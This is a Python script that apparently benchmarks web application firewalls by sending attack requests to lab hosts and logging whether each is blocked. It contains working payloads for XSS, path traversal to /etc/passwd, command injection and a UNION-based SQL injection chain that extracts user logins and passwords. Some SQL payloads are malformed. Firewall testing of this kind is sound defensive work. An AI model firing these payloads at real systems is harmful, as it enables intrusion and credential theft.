# Description: Simulate attacks on different targets to test WAF effectiveness
import json
import time

import requests

# Target instances
TARGETS = {
    "No WAF": "http://snf-6360.vlab.ac.ke",
    # "CrowdSec": "http://snf-3406.vlab.ac.ke",
    "SafeLine": "http://snf-3406.vlab.ac.ke",
    "ModSecurity": "http://snf-3351.vlab.ac.ke"
}

# Attack scenarios
ATTACKS = [
    {
        "type": "XSS",
        "endpoint": "/test.php",
        "method": "GET",
        "params": {"q": "<script>alert('XSS')</script>"},
    },
    {
        "type": "LFI",
        "endpoint": "/test.php",
        "method": "GET",
        "params": {"file": "../../etc/passwd"},
    },
    {
        "type": "Command Injection",
        "endpoint": "/ping.php",
        "method": "POST",
        "data": {"ip": "127.0.0.1; ls -la"},
    },
    {
        "type": "HTML Injection - Reflected (GET)",
        "endpoint": "/htmli_get.php",
        "method": "GET",
        "params": {"firstname": "hello", "lastname": "<b>world<%2Fb>", "form": "submit"}
    },
    {
        "type": "Remote & Local File Inclusion (RFI/LFI)",
        "endpoint": "/rlfi.php",
        "method": "GET",
        "params": {"language": "/etc/passwd"}
    },
    {
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "blah%27+or+1=1--%20", "action": "search"}
    },
    {
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’order by 1- - -", "action": "search"}
    },
    {
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’order by 8- - - (out of clausle)", "action": "search"}
    },
    {    
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’union select 1,2,3,4,5,6,7, - - -", "action": "search"}
    },
    {    
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’union select 1,2,3,4, database (), 6,7, - - -", "action": "search"}
    },
    {    
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’union select 1,2,3,4, version (), 6,7, - - -", "action": "search"}
    },
    {    
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’union select 1,2,3,4, table_name, 6,7 from information_schema.tables- - -", "action": "search"}
    },
    {    
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’union select 1,2,3,4, table_name, 6,7 from information_schema.tables where table_schema = database () - - -", "action": "search"}
    },
    {    
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’union select 1,2,3,4, group_concat (table_name), 6,7 from information_schema.tables where table_schema = database () - - -", "action": "search"}
    },
    {    
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’union select 1,2,3,4, group_concat (colume_name), 6,7 from information_schema.tables where table_schema =’ users’- - -", "action": "search"}
    },
    {    
        "type": "SQL Injection",
        "endpoint": "/sqli_1.php",
        "method": "GET",
        "params": {"title": "1 ’union select 1,2,3,4, group_concat (login, password), 6,7, from users- - -", "action": "search"}
    },
    # Sensitive File Access
    
    {
        "type": "Sensitive File Access", 
        "endpoint": "/phpinfo.php", 
        "method": "GET"
    },
    {
        "type": "Sensitive File Access", 
        "endpoint": "/config.inc", 
        "method": "GET"
    },
    {
        "type": "Sensitive Directory Listing", 
        "endpoint": "/passwords/", 
        "method": "GET"
    },
    {
        "type": "Sensitive Directory Listing", 
        "endpoint": "/db/", 
        "method": "GET"
    },
    {
        "type": "Sensitive Directory Listing", 
        "endpoint": "/documents/", 
        "method": "GET"
    },
    # Cookie Security Check
    {
        "type": "Cookie Security Check", 
        "endpoint": "/", 
        "method": "GET", 
    }
]

# Data collection function
def attack_target(target_name, base_url):
    results = []
    
    for attack in ATTACKS:
        url = base_url + attack["endpoint"]
        method = attack["method"]

        # print(f"\n🔍 Testing [{attack['type']}] on {target_name} ({attack['endpoint']})...")
        print(f"\n🔍 Testing [{attack['type']}] on {target_name} ({url})...")

        try:
            start_time = time.perf_counter()

            if method == "GET":
                if "params" not in attack :
                    response = requests.get(url, timeout=5)
                else:
                    response = requests.get(url, params=attack.get("params"), timeout=5)
            elif method == "POST":
                response = requests.post(url, data=attack.get("data"), timeout=5)
            else:
                continue

            end_time = time.perf_counter()
            elapsed_time = end_time - start_time  # in seconds

            request_data = None
            if attack["method"] == "GET":
                request_data = attack.get("params")
            else:
                request_data = attack.get("data")

            result = {
                "target": target_name,
                "attack_type": attack["type"],
                "endpoint": attack["endpoint"],
                "request": request_data,
                "status_code": response.status_code,
                "response_time_seconds": round(elapsed_time, 4),
            }

            results.append(result)

            # Log potential blocking behavior
            if response.status_code in [403, 406, 500] or "blocked" in response.text.lower():
                print(f"🚨 [{target_name}] {attack['type']} was BLOCKED (Status: {response.status_code})")
            else:
                print(f"✅ [{target_name}] {attack['type']} might be SUCCESSFUL (Status: {response.status_code})")

            # Delay to avoid rate-limiting
            time.sleep(1)

        except requests.exceptions.RequestException as e:
            print(f"❌ Error testing {attack['type']} on {target_name}: {e}")

    return results

# Run attacks on all targets
all_results = []

for name, url in TARGETS.items():
    results = attack_target(name, url)
    all_results.extend(results)

# Save results to JSON file
with open("attack_results.json", "w") as file:
    json.dump(all_results, file, indent=4)

print("\n📊 Attack simulation completed! Results saved to attack_results.json.")
